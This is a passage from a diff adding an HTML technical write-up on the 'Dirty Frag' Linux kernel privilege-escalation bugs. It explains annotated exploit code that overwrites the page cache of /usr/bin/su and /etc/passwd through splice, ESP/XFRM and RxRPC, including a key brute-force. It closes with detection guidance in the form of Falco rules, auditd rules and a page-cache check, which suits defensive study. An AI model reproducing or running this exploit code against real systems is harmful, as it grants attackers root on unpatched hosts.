+        ((<span class="hl-type">uint32_t</span>)shell_elf[i*<span class="hl-num">4</span> + <span class="hl-num">3</span>]);
+    <span class="hl-fn">add_xfrm_sa</span>(spi, seqhi);  <span class="hl-cm">/* registers SA via NETLINK_XFRM */</span>
+}</code></pre>
+      </div>
+      <p>Inside <span class="ic">add_xfrm_sa()</span>, a raw <span class="ic">NETLINK_XFRM</span> socket sends an <span class="ic">XFRM_MSG_NEWSA</span> message. The SA configuration is: protocol <span class="ic">IPPROTO_ESP</span>, transport mode, <span class="ic">XFRM_STATE_ESN</span> flag set, algorithm <span class="ic">hmac(sha256) + cbc(aes)</span> with arbitrary keys (0xAA and 0xBB filled), UDP encapsulation on port 4500, and the replay state with <span class="ic">seq_hi = patch_seqhi</span> (the shellcode chunk). The HMAC and AES keys are arbitrary because HMAC verification will always fail — that's by design.</p>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">ESP Variant: do_one_write() — The Write Trigger</h3>
+      <p>For each of the 48 chunks, <span class="ic">do_one_write()</span> fires the actual kernel-side write. This is the most important function in the ESP path. It:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — do_one_write() annotated</span></div>
+        <pre><code><span class="hl-cm">/* 1. sk_recv: UDP socket on 127.0.0.1:4500 with UDP_ENCAP_ESPINUDP.
+      Any UDP packets arriving here that look like ESP are redirected
+      into xfrm_input() → esp_input() by the kernel automatically. */</span>
+<span class="hl-kw">int</span> sk_recv = <span class="hl-fn">socket</span>(AF_INET, SOCK_DGRAM, <span class="hl-num">0</span>);
+<span class="hl-fn">bind</span>(sk_recv, &sa_d, ...);         <span class="hl-cm">/* 127.0.0.1:4500 */</span>
+<span class="hl-fn">setsockopt</span>(sk_recv, IPPROTO_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP, ...);
+
+<span class="hl-cm">/* 2. sk_send: a regular UDP socket connected to 127.0.0.1:4500.
+      Sending here delivers to sk_recv over loopback. */</span>
+<span class="hl-kw">int</span> sk_send = <span class="hl-fn">socket</span>(AF_INET, SOCK_DGRAM, <span class="hl-num">0</span>);
+<span class="hl-fn">connect</span>(sk_send, &sa_d, ...);
+
+<span class="hl-cm">/* 3. Build the forged ESP wire header in a local buffer.
+      Format: [SPI: 4B] [seq_lo: 4B] [IV: 16B] = 24 bytes total.
+      SEQ_VAL = 200 (hardcoded). IV is 0xCC-filled (value irrelevant —
+      authentication fails anyway). */</span>
+<span class="hl-type">uint8_t</span> hdr[<span class="hl-num">24</span>];
+*(<span class="hl-type">uint32_t</span>*)(hdr + <span class="hl-num">0</span>) = <span class="hl-fn">htonl</span>(spi);      <span class="hl-cm">/* this chunk's SPI */</span>
+*(<span class="hl-type">uint32_t</span>*)(hdr + <span class="hl-num">4</span>) = <span class="hl-fn">htonl</span>(SEQ_VAL);  <span class="hl-cm">/* SEQ_VAL = 200 */</span>
+<span class="hl-fn">memset</span>(hdr + <span class="hl-num">8</span>, <span class="hl-num">0xCC</span>, <span class="hl-num">16</span>);              <span class="hl-cm">/* AES-CBC IV */</span>
+
+<span class="hl-cm">/* 4. vmsplice: put the 24-byte header into the pipe's write end.
+      The data lives in user-space (local array), so this is a normal
+      copy into the pipe buffer. */</span>
+<span class="hl-fn">vmsplice</span>(pfd[<span class="hl-num">1</span>], &iov_h, <span class="hl-num">1</span>, <span class="hl-num">0</span>);
+
+<span class="hl-cm">/* 5. splice: move 16 bytes of /usr/bin/su starting at byte (i*4) into
+      the pipe. CRITICAL: 'off' is passed as a pointer so the kernel
+      uses it as the file offset. This is a zero-copy operation — the
+      pipe now holds a reference to the actual page cache page of
+      /usr/bin/su, not a copy of its bytes. */</span>
+off_t off = offset;   <span class="hl-cm">/* = PATCH_OFFSET + i*4 */</span>
+<span class="hl-fn">splice</span>(file_fd, &off, pfd[<span class="hl-num">1</span>], <span class="hl-kw">NULL</span>, <span class="hl-num">16</span>, SPLICE_F_MOVE);
+
+<span class="hl-cm">/* 6. splice: move the pipe contents (24+16 = 40 bytes) into sk_send.
+      splice() to a socket automatically sets MSG_SPLICE_PAGES, which
+      tells the kernel to keep the page-cache page as a frag in the
+      skb rather than copying it. The page is now in skb->frags[0]. */</span>
+<span class="hl-fn">splice</span>(pfd[<span class="hl-num">0</span>], <span class="hl-kw">NULL</span>, sk_send, <span class="hl-kw">NULL</span>, <span class="hl-num">24</span> + <span class="hl-num">16</span>, SPLICE_F_MOVE);
+
+<span class="hl-cm">/* 7. Wait 150ms. The kernel routes the packet over loopback to sk_recv,
+      which sees it as a UDP-encapsulated ESP packet and calls esp_input().
+      The sleep ensures the kernel has processed the packet before we
+      close the file descriptor and the pipe. */</span>
+<span class="hl-fn">usleep</span>(<span class="hl-num">150</span> * <span class="hl-num">1000</span>);
+
+<span class="hl-cm">/* fds closed. The page cache of /usr/bin/su at byte (i*4) now holds
+   the 4 bytes from shell_elf[i*4..i*4+3]. The on-disk file is unchanged.
+   EBADMSG was returned inside esp_input() but the STORE already happened. */</span></code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <strong>The 150ms sleep — not truly race-free</strong>
+        The write-up calls this "deterministic" because there is no <em>data race</em> (no concurrent threads fighting over the same memory). However, <span class="ic">do_one_write()</span> does include a <span class="ic">usleep(150ms)</span> after the final <span class="ic">splice()</span>. This sleep exists to give the kernel time to deliver the packet through the loopback stack and trigger <span class="ic">esp_input()</span> before the pipe and socket file descriptors are closed. "Deterministic" means the outcome is predictable and reproducible, not that timing is irrelevant.
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">RxRPC Variant: Key Setup and Fake Handshake</h3>
+      <p>The RxRPC path does not use <span class="ic">unshare()</span> by default. Looking at the actual code, <span class="ic">rxrpc_lpe_main()</span> only calls <span class="ic">do_unshare_userns_netns()</span> if the environment variable <span class="ic">POC_UNSHARE=1</span> is explicitly set — it is opt-in, not default. The path operates entirely with normal user privileges. The exploit first opens a dummy <span class="ic">socket(AF_RXRPC, SOCK_DGRAM, PF_INET)</span> and closes it immediately — this sole purpose is to trigger the kernel to autoload the <span class="ic">rxrpc.ko</span> module via the <span class="ic">MODULE_ALIAS_NETPROTO(PF_RXRPC)</span> alias. Without this step, subsequent <span class="ic">add_key("rxrpc", ...)</span> calls fail with <span class="ic">ENODEV</span> because the kernel's "rxrpc" key type is registered only when the module loads.</p>
+      <p>The exploit then mmaps the first page of <span class="ic">/etc/passwd</span> with <span class="ic">MAP_SHARED | PROT_READ</span>. This keeps the page cache page pinned in memory throughout the exploit and also lets the code verify the result after triggering by reading from the mmap pointer directly — which reflects the live in-memory state, not a cached fd read.</p>
+      <p>The setup involves four cooperating pieces per trigger:</p>
+      <ul style="list-style:none;display:flex;flex-direction:column;gap:8px;margin:12px 0 18px 0;">
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> <strong style="color:var(--text)">RxRPC key</strong> (<span class="ic">add_key("rxrpc", desc, token, len, KEY_SPEC_PROCESS_KEYRING)</span>): a fake AFS/Kerberos v1 token with the cell name <span class="ic">"evil"</span>, <span class="ic">sec_ix=2</span> (RXKAD), and the 8-byte brute-forced key K placed in the <span class="ic">session_key</span> field. Each trigger gets a unique key name (<span class="ic">"evil0"</span>, <span class="ic">"evil1"</span>, <span class="ic">"evil2"</span>) to avoid stale state. After the trigger fires the key is explicitly invalidated with <span class="ic">keyctl(KEYCTL_INVALIDATE, key)</span>.</li>
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> <strong style="color:var(--text)">Fake server</strong>: a plain <span class="ic">socket(AF_INET, SOCK_DGRAM)</span> bound to <span class="ic">127.0.0.1:port_S</span>. Ports rotate as <span class="ic">7777 + (trigger_seq * 2 % 200)</span> to avoid TIME_WAIT collisions.</li>
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> <strong style="color:var(--text)">AF_RXRPC client</strong>: <span class="ic">socket(AF_RXRPC, SOCK_DGRAM, PF_INET)</span> configured with the attack key via <span class="ic">RXRPC_SECURITY_KEY</span> and <span class="ic">RXRPC_MIN_SECURITY_LEVEL = RXRPC_SECURITY_AUTH (1)</span>.</li>
+        <li style="font-size:.87rem;color:var(--text2);padding-left:18px;position:relative;"><span style="position:absolute;left:0;color:var(--accent);">▸</span> <strong style="color:var(--text)">AF_ALG pcbc(fcrypt) socket</strong>: used purely in userspace to precompute the wire <span class="ic">cksum</span> field that the forged DATA packet must carry to pass the first verification gate in <span class="ic">rxkad_verify_packet()</span> before reaching the vulnerable in-place decrypt in <span class="ic">rxkad_verify_packet_1()</span>.</li>
+      </ul>
+
+      <p>The handshake sequence is:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — do_one_trigger() handshake flow</span></div>
+        <pre><code><span class="hl-cm">/* Step 1: client initiates RPC call → sends a DATA packet to port_S */</span>
+<span class="hl-fn">rxrpc_client_initiate_call</span>(rxsk_cli, port_S, svc_id, <span class="hl-num">0xDEAD</span>);
+
+<span class="hl-cm">/* Step 2: fake server receives the client's initial packet, extracts
+   the session identifiers (epoch, cid, callNumber) needed to forge
+   a valid-looking reply later. */</span>
+<span class="hl-fn">udp_recv_to</span>(udp_srv, pkt, <span class="hl-kw">sizeof</span>(pkt), &cli_addr, <span class="hl-num">1500</span>);
+epoch  = <span class="hl-fn">ntohl</span>(whdr_in->epoch);
+cid    = <span class="hl-fn">ntohl</span>(whdr_in->cid);
+callN  = <span class="hl-fn">ntohl</span>(whdr_in->callNumber);
+
+<span class="hl-cm">/* Step 3: fake server sends a CHALLENGE packet (type=6, RXKAD security).
+   nonce=0xDEADBEEF, min_level=1 (RXRPC_SECURITY_AUTH).
+   The client's kernel RxRPC stack processes this automatically and
+   sends back a RESPONSE containing K encrypted under the session key.
+   This also causes the client's conn->rxkad.cipher to be initialised
+   with K, which is what we need for the verify path. */</span>
+challenge.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;  <span class="hl-cm">/* 6 */</span>
+challenge.hdr.securityIndex = <span class="hl-num">2</span>;                    <span class="hl-cm">/* RXKAD */</span>
+challenge.ch.nonce = <span class="hl-fn">htonl</span>(<span class="hl-num">0xDEADBEEFu</span>);
+<span class="hl-fn">sendto</span>(udp_srv, &challenge, <span class="hl-kw">sizeof</span>(challenge), ...);
+
+<span class="hl-cm">/* Step 4: drain the RESPONSE (we don't verify it — we have no real
+   ticket). The connection is now live and secured with K. */</span>
+<span class="hl-fn">udp_recv_to</span>(udp_srv, pkt, <span class="hl-kw">sizeof</span>(pkt), &src, <span class="hl-num">500</span>); <span class="hl-cm">/* ×4 */</span>
+
+<span class="hl-cm">/* Step 5: compute the wire cksum the forged DATA packet must carry.
+   Uses AF_ALG pcbc(fcrypt) in userspace — no kernel modification.
+   Two PCBC-encrypt operations: first to get csum_iv, then the actual
+   cksum. This precomputation is what lets the forged packet sail past
+   rxkad_verify_packet()'s cksum check and reach verify_packet_1(). */</span>
+<span class="hl-fn">compute_csum_iv</span>(epoch, cid, <span class="hl-num">2</span>, SESSION_KEY, csum_iv);
+<span class="hl-fn">compute_cksum</span>(cid, callN, <span class="hl-num">1</span>, SESSION_KEY, csum_iv, &cksum_h);</code></pre>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">RxRPC Variant: Splice Trigger and the In-Place Decrypt</h3>
+      <p>With the cksum precomputed and the connection live, the exploit sends the forged DATA packet with <span class="ic">/etc/passwd</span>'s page cache page in its frag — exactly the same splice pattern as the ESP variant, just targeting a different file and using UDP instead of the XFRM SA receive path:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — do_one_trigger() splice and recv</span></div>
+        <pre><code><span class="hl-cm">/* Build forged DATA wire header with precomputed cksum */</span>
+<span class="hl-kw">struct</span> rxrpc_wire_header mal = {<span class="hl-num">0</span>};
+mal.type       = RXRPC_PACKET_TYPE_DATA;   <span class="hl-cm">/* 1 */</span>
+mal.flags      = RXRPC_LAST_PACKET;
+mal.securityIndex = <span class="hl-num">2</span>;                    <span class="hl-cm">/* RXKAD */</span>
+mal.cksum      = <span class="hl-fn">htons</span>(cksum_h);          <span class="hl-cm">/* precomputed — passes first verify */</span>
+<span class="hl-cm">/* ... epoch, cid, callNumber from the real handshake ... */</span>
+
+<span class="hl-cm">/* connect udp_srv → client port so splice can send via a connected socket */</span>
+<span class="hl-fn">connect</span>(udp_srv, &dst_cli, <span class="hl-kw">sizeof</span>(dst_cli));
+
+<span class="hl-cm">/* vmsplice: wire header (28 bytes) into pipe — normal copy from local struct */</span>
+<span class="hl-fn">vmsplice</span>(p[<span class="hl-num">1</span>], &viv, <span class="hl-num">1</span>, <span class="hl-num">0</span>);
+
+<span class="hl-cm">/* splice: 8 bytes of /etc/passwd at file offset splice_off into the pipe.
+   Zero-copy — page cache page P of /etc/passwd is now in the pipe frag. */</span>
+loff_t off = splice_off;
+<span class="hl-fn">splice</span>(target_fd, &off, p[<span class="hl-num">1</span>], <span class="hl-kw">NULL</span>, splice_len, SPLICE_F_NONBLOCK);
+
+<span class="hl-cm">/* splice: pipe → udp_srv (connected to client). MSG_SPLICE_PAGES is set
+   automatically because splice() to a socket uses that path.
+   Page cache page P of /etc/passwd is now in the skb's frag[0]. */</span>
+<span class="hl-fn">splice</span>(p[<span class="hl-num">0</span>], <span class="hl-kw">NULL</span>, udp_srv, <span class="hl-kw">NULL</span>, <span class="hl-kw">sizeof</span>(mal) + splice_len, <span class="hl-num">0</span>);
+
+<span class="hl-cm">/* recvmsg on rxsk_cli: the client's kernel RxRPC stack picks up the
+   forged DATA packet. It passes rxkad_verify_packet()'s cksum check,
+   then reaches rxkad_verify_packet_1() which does in-place
+   pcbc(fcrypt) decrypt — writing fcrypt_decrypt(C, K) into page P
+   at offset splice_off. Returns -EPROTO, but the STORE is done. */</span>
+<span class="hl-fn">recvmsg</span>(rxsk_cli, &m, <span class="hl-num">0</span>);</code></pre>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">RxRPC Variant: Userspace fcrypt Brute-Force — How It Actually Works</h3>
+      <p>This is the most technically interesting part of the exploit, and the part most commonly described incorrectly in secondary sources. Here is exactly what the code does.</p>
+      <p><strong>The problem:</strong> The 8 bytes that the kernel will STORE into the page cache are <span class="ic">fcrypt_decrypt(C, K)</span> — where <span class="ic">C</span> is the 8 bytes currently at the target file offset, and <span class="ic">K</span> is the 8-byte session key the attacker plants in the RxRPC token. The attacker controls <span class="ic">K</span> freely but cannot choose the STORE value directly — they must find a <span class="ic">K</span> whose decryption of <span class="ic">C</span> produces the desired plaintext bytes.</p>
+      <p><strong>The search strategy:</strong> The code does <em>not</em> iterate keys sequentially from 0. Instead, it uses a <strong>splitmix64 PRNG</strong> — a high-quality, fast pseudo-random number generator — seeded from the current time XOR the PID, then generates random 8-byte keys and tests each one against the userspace fcrypt implementation:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — brute-force core loop (actual code)</span></div>
+        <pre><code><span class="hl-kw">static</span> <span class="hl-type">uint64_t</span> <span class="hl-fn">fc_splitmix64</span>(<span class="hl-type">uint64_t</span> *s) {
+    <span class="hl-type">uint64_t</span> z = (*s += <span class="hl-num">0x9E3779B97F4A7C15ULL</span>);
+    z = (z ^ (z >> <span class="hl-num">30</span>)) * <span class="hl-num">0xBF58476D1CE4E5B9ULL</span>;
+    z = (z ^ (z >> <span class="hl-num">27</span>)) * <span class="hl-num">0x94D049BB133111EBULL</span>;
+    <span class="hl-kw">return</span> z ^ (z >> <span class="hl-num">31</span>);
+}
+
+<span class="hl-kw">for</span> (<span class="hl-type">uint64_t</span> iter = <span class="hl-num">0</span>; iter < max_iters; iter++) {
+    <span class="hl-type">uint64_t</span> r = <span class="hl-fn">fc_splitmix64</span>(&seed);  <span class="hl-cm">/* random 8-byte key */</span>
+    <span class="hl-fn">memcpy</span>(K, &r, <span class="hl-num">8</span>);
+    <span class="hl-fn">fcrypt_user_setkey</span>(&ctx, K);
+    <span class="hl-fn">fcrypt_user_decrypt</span>(&ctx, P, C);  <span class="hl-cm">/* P = fcrypt_decrypt(C, K) */</span>
+    <span class="hl-kw">if</span> (<span class="hl-fn">check</span>(P)) { <span class="hl-cm">/* does P match our target predicate? */</span>
+        <span class="hl-fn">memcpy</span>(K_out, K, <span class="hl-num">8</span>); <span class="hl-fn">memcpy</span>(P_out, P, <span class="hl-num">8</span>);
+        <span class="hl-kw">return</span> <span class="hl-num">0</span>;
+    }
+}</code></pre>
+      </div>
+      <p><strong>The target predicates and their probability:</strong> The code's comments directly state the success probability for each of the three searches — these come from the structure of the constraints:</p>
+
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — predicate checks with probabilities from comments</span></div>
+        <pre><code><span class="hl-cm">/* K_A: P[0]==':' AND P[1]==':'  →  prob ~1.5e-5  (≈ 1 in 65,536)
+   Expected: ~65,536 iterations. At 18M/s → < 4ms */</span>
+<span class="hl-kw">static inline int</span> <span class="hl-fn">fc_check_pa_nullok</span>(<span class="hl-kw">const</span> <span class="hl-type">uint8_t</span> P[<span class="hl-num">8</span>]) {
+    <span class="hl-kw">return</span> P[<span class="hl-num">0</span>] == <span class="hl-str">':'</span> && P[<span class="hl-num">1</span>] == <span class="hl-str">':'</span>;
+}
+
+<span class="hl-cm">/* K_B: P[0]=='0' AND P[1]==':'  →  prob ~1.5e-5  (≈ 1 in 65,536)
+   Expected: ~65,536 iterations. At 18M/s → < 4ms */</span>
+<span class="hl-kw">static inline int</span> <span class="hl-fn">fc_check_pb_nullok</span>(<span class="hl-kw">const</span> <span class="hl-type">uint8_t</span> P[<span class="hl-num">8</span>]) {
+    <span class="hl-kw">return</span> P[<span class="hl-num">0</span>] == <span class="hl-str">'0'</span> && P[<span class="hl-num">1</span>] == <span class="hl-str">':'</span>;
+}
+
+<span class="hl-cm">/* K_C: P[0]=='0', P[1]==':', P[7]==':',
+        P[2..6] ≠ ':', '\0', '\n'        →  prob ~5.4e-8  (≈ 1 in 18.5M)
+   Expected: ~18.5M iterations. At 18M/s → ~1 second */</span>
+<span class="hl-kw">static inline int</span> <span class="hl-fn">fc_check_pc_nullok</span>(<span class="hl-kw">const</span> <span class="hl-type">uint8_t</span> P[<span class="hl-num">8</span>]) {
+    <span class="hl-kw">if</span> (P[<span class="hl-num">0</span>] != <span class="hl-str">'0'</span> || P[<span class="hl-num">1</span>] != <span class="hl-str">':'</span> || P[<span class="hl-num">7</span>] != <span class="hl-str">':'</span>) <span class="hl-kw">return</span> <span class="hl-num">0</span>;
+    <span class="hl-kw">for</span> (<span class="hl-kw">int</span> i = <span class="hl-num">2</span>; i < <span class="hl-num">7</span>; i++)
+        <span class="hl-kw">if</span> (P[i] == <span class="hl-str">':'</span> || P[i] == <span class="hl-str">'\0'</span> || P[i] == <span class="hl-str">'\n'</span>) <span class="hl-kw">return</span> <span class="hl-num">0</span>;
+    <span class="hl-kw">return</span> <span class="hl-num">1</span>;
+}</code></pre>
+      </div>
+
+      <p>K_A and K_B only constrain 2 bytes of the 8-byte output (probability ~1/256² ≈ 1 in 65,536), so they are found in milliseconds. K_C constrains 4 specific byte values plus 5 bytes being "not colon, not null, not newline", giving a probability of about 1 in 18.5 million — found in roughly one second at 18 million keys/second.</p>
+
+      <p><strong>The chained-ciphertext correction:</strong> After splice A fires, the bytes at <span class="ic">/etc/passwd</span> offset 6 are no longer the original file bytes — they are whatever <span class="ic">Pa_out[2..7]</span> wrote there. So when the code searches for K_B, it cannot use the original <span class="ic">Cb</span> read from disk. It must construct <span class="ic">Cb_actual</span> from the plaintext already written by splice A:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">exp.c — chained ciphertext correction (actual code)</span></div>
+        <pre><code><span class="hl-cm">/* After splice A fires at offset 4 (8 bytes), bytes 6..11 now hold Pa_out[2..7].
+   Bytes 12..13 (= Cb[6..7]) are still original — splice A didn't reach them.
+   Cb_actual is what splice B's kernel decrypt will see as its ciphertext. */</span>
+<span class="hl-fn">memcpy</span>(Cb_actual, Pa_out + <span class="hl-num">2</span>, <span class="hl-num">6</span>);
+<span class="hl-fn">memcpy</span>(Cb_actual + <span class="hl-num">6</span>, Cb + <span class="hl-num">6</span>, <span class="hl-num">2</span>);
+<span class="hl-cm">/* Search K_B against Cb_actual, not the original Cb */</span>
+<span class="hl-fn">find_K_offline_generic</span>(Cb_actual, max_iters, fc_check_pb_nullok, Kb, Pb_out, ...);
+
+<span class="hl-cm">/* Same correction for splice C: after B fires at offset 6, bytes 8..13
+   now hold Pb_out[2..7]. Bytes 14..15 (= Cc[6..7]) are still original. */</span>
+<span class="hl-fn">memcpy</span>(Cc_actual, Pb_out + <span class="hl-num">2</span>, <span class="hl-num">6</span>);
+<span class="hl-fn">memcpy</span>(Cc_actual + <span class="hl-num">6</span>, Cc + <span class="hl-num">6</span>, <span class="hl-num">2</span>);
+<span class="hl-fn">find_K_offline_generic</span>(Cc_actual, max_iters, fc_check_pc_nullok, Kc, Pc_out, ...);</code></pre>
+      </div>
+
+      <p>All three key searches happen entirely in userspace with no kernel interaction. Only after all three keys are found does the exploit fire the three kernel triggers in order. The entire brute-force stage completes in well under 2 seconds on a modern CPU.</p>
+
+      <p><strong>The fcrypt implementation:</strong> The exploit embeds a complete port of the Linux kernel's <span class="ic">crypto/fcrypt.c</span> (originally by David Howells / KTH) as static C code — four 256-entry S-box tables, key schedule generation, and a 16-round Feistel decrypt function. It includes a built-in self-test verified against known kernel test vectors before the brute-force begins. If the selftest fails, the RxRPC path aborts cleanly rather than producing garbage output.</p>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION 7 — Detection -->
+  <section class="article-section" id="s6">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-magnifying-glass"></i> Detection Strategies</h2>
+
+    <p>Like Copy Fail, Dirty Frag leaves nothing on disk and issues no <span class="ic">write()</span> syscalls to the target file. Detection has to focus on behavioral signals: the specific syscall patterns, module load events, and network activity that the exploit produces as a side effect.</p>
+
+    <p>One thing worth noting from the code: the ESP path runs inside a forked child process that calls <span class="ic">unshare()</span> and registers XFRM SAs, while the RxRPC path runs in the main process with no namespace changes. An EDR that tracks process trees will see different parent-child relationships for each variant. The default binary also suppresses its own stderr via <span class="ic">dup2(/dev/null)</span>, so no console output is produced under normal execution.</p>
+
+    <table class="compare-table">
+      <thead>
+        <tr><th>Signal</th><th>Detects?</th><th>Notes</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>sha256sum / rpm -V / AIDE / Tripwire</td><td class="fail">No</td><td>All compare on-disk content only. Page cache modifications are completely invisible to them.</td></tr>
+        <tr><td>auditd write() syscall auditing</td><td class="fail">No</td><td>The STORE happens inside the kernel's crypto scatter-gather walk, not through any write() syscall.</td></tr>
+        <tr><td>EDR on-access file scanners</td><td class="fail">No</td><td>These hook write syscalls. Since no write syscall occurs, nothing triggers.</td></tr>
+        <tr><td>XFRM SA registration via NETLINK_XFRM</td><td class="ok">Yes (ESP)</td><td>The exploit sends XFRM_MSG_NEWSA from a non-VPN process. Rare in legitimate workloads.</td></tr>
+        <tr><td>unshare(CLONE_NEWUSER|CLONE_NEWNET)</td><td class="ok">Yes (ESP)</td><td>The ESP child calls this before SA registration. Combine with subsequent XFRM activity for high confidence.</td></tr>
+        <tr><td>add_key("rxrpc", ...) from unexpected process</td><td class="ok">Yes (RxRPC)</td><td>No legitimate user process adds RxRPC keys outside of an AFS client. Any unexpected occurrence is high signal.</td></tr>
+        <tr><td>socket(AF_RXRPC) from unexpected process</td><td class="ok">Yes (RxRPC)</td><td>AF_RXRPC is socket family 33. The exploit opens one per trigger. Extremely rare outside AFS environments.</td></tr>
+        <tr><td>rxrpc or esp4 module loaded unexpectedly</td><td class="warn">Weak</td><td>Useful as a baseline check on servers that never use IPsec or AFS. Not reliable alone.</td></tr>
+        <tr><td>In-memory page cache audit</td><td class="ok">Yes</td><td>Compare live page cache of setuid binaries against their on-disk content. A mismatch at offset 0x78 of /usr/bin/su is definitive.</td></tr>
+        <tr><td>Defender for Linux hash signatures</td><td class="ok">Partial</td><td>Detects the known PoC binary. Bypassed trivially by recompiling with any code change.</td></tr>
+      </tbody>
+    </table>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Falco Rules</h3>
+      <p>The most practical open-source detection approach is monitoring for the specific syscall combinations the exploit produces. Neither variant's individual syscalls is alarming in isolation, but the combination with the target process context is distinctive:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">YAML</span><span class="cb-file">falco-dirtyfrag.yaml</span></div>
+        <pre><code><span class="hl-kw">- rule:</span> Dirty Frag ESP - XFRM SA from non-VPN process
+  <span class="hl-kw">desc:</span> Detects XFRM_MSG_NEWSA netlink from a process that is not a known VPN daemon (CVE-2026-43284)
+  <span class="hl-kw">condition:</span> evt.type = sendmsg
+    <span class="hl-kw">and</span> fd.type = netlink
+    <span class="hl-kw">and</span> evt.arg.msg contains xfrm_sa
+    <span class="hl-kw">and</span> <span class="hl-kw">not</span> proc.name <span class="hl-kw">in</span> (strongswan, charon, libreswan, ipsec, pluto)
+  <span class="hl-kw">output:</span> <span class="hl-str">"XFRM SA from unexpected process %proc.name (user=%user.name pid=%proc.pid)"</span>
+  <span class="hl-kw">priority:</span> CRITICAL
+  <span class="hl-kw">tags:</span> [CVE-2026-43284, lpe, dirtyfrag]
+
+<span class="hl-kw">- rule:</span> Dirty Frag RxRPC - add_key rxrpc from unexpected process
+  <span class="hl-kw">desc:</span> Detects add_key("rxrpc") from a non-AFS process (CVE-2026-43500)
+  <span class="hl-kw">condition:</span> evt.type = add_key
+    <span class="hl-kw">and</span> evt.arg.type = <span class="hl-str">"rxrpc"</span>
+    <span class="hl-kw">and</span> <span class="hl-kw">not</span> proc.name <span class="hl-kw">in</span> (afsd, kafs)
+  <span class="hl-kw">output:</span> <span class="hl-str">"rxrpc key added by unexpected process %proc.name (user=%user.name pid=%proc.pid)"</span>
+  <span class="hl-kw">priority:</span> CRITICAL
+  <span class="hl-kw">tags:</span> [CVE-2026-43500, lpe, dirtyfrag]
+
+<span class="hl-kw">- rule:</span> Dirty Frag - socket(AF_RXRPC) from unexpected process
+  <span class="hl-kw">desc:</span> Detects AF_RXRPC socket creation outside AFS context (both CVEs)
+  <span class="hl-kw">condition:</span> evt.type = socket
+    <span class="hl-kw">and</span> evt.arg.domain = <span class="hl-num">33</span>
+    <span class="hl-kw">and</span> <span class="hl-kw">not</span> proc.name <span class="hl-kw">in</span> (afsd, kafs)
+  <span class="hl-kw">output:</span> <span class="hl-str">"AF_RXRPC socket from unexpected process %proc.name (user=%user.name pid=%proc.pid)"</span>
+  <span class="hl-kw">priority:</span> WARNING
+  <span class="hl-kw">tags:</span> [CVE-2026-43500, lpe, dirtyfrag]</code></pre>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">auditd Rules</h3>
+      <p>The <span class="ic">unshare</span> filter below uses the flag value <span class="ic">0x40000000</span> which is <span class="ic">CLONE_NEWNET</span>. The ESP path calls <span class="ic">unshare(CLONE_NEWUSER | CLONE_NEWNET)</span> which equals <span class="ic">0x10000000 | 0x40000000 = 0x50000000</span>. Filtering on <span class="ic">a0=0x50000000</span> catches the exact combination used by the exploit while reducing false positives from processes that unshare only a user namespace:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">Bash</span><span class="cb-file">/etc/audit/rules.d/dirtyfrag.rules</span></div>
+        <pre><code><span class="hl-cm"># ESP variant: unshare(CLONE_NEWUSER|CLONE_NEWNET) = 0x50000000</span>
+<span class="hl-fn">-a</span> always,exit <span class="hl-fn">-F</span> arch=b64 <span class="hl-fn">-S</span> unshare <span class="hl-fn">-F</span> a0=0x50000000 <span class="hl-fn">-k</span> dirtyfrag_esp
+
+<span class="hl-cm"># RxRPC variant: any add_key call (filter by key type in ausearch)</span>
+<span class="hl-fn">-a</span> always,exit <span class="hl-fn">-F</span> arch=b64 <span class="hl-fn">-S</span> add_key <span class="hl-fn">-k</span> dirtyfrag_rxrpc
+
+<span class="hl-cm"># Search for hits:</span>
+<span class="hl-cm"># ausearch -k dirtyfrag_esp</span>
+<span class="hl-cm"># ausearch -k dirtyfrag_rxrpc | grep rxrpc</span></code></pre>
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Post-Exploitation: Detecting the Page Cache Modification</h3>
+      <p>If you suspect a system has already been compromised, the most reliable check is to compare the live page cache content of <span class="ic">/usr/bin/su</span> against its on-disk content. A mismatch means the page cache was modified without going through the normal write path. The simplest way to do this is to drop the page cache and then compare:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">Bash</span><span class="cb-file">check for page cache modification</span></div>
+        <pre><code><span class="hl-cm"># Step 1: hash the current in-memory version (reads from page cache)</span>
+sha256sum /usr/bin/su
+
+<span class="hl-cm"># Step 2: drop page cache and re-hash (forces re-read from disk)</span>
+echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null
+sha256sum /usr/bin/su
+
+<span class="hl-cm"># If the two hashes differ, the page cache was modified without
+# touching the disk. This is the Dirty Frag / Copy Fail fingerprint.
+# You can also check the specific marker bytes at offset 0x78:</span>
+xxd -s 0x78 -l 8 /usr/bin/su</code></pre>
+      </div>
+      <div class="callout callout-warn">
+        <strong>drop_caches is disruptive in production</strong>
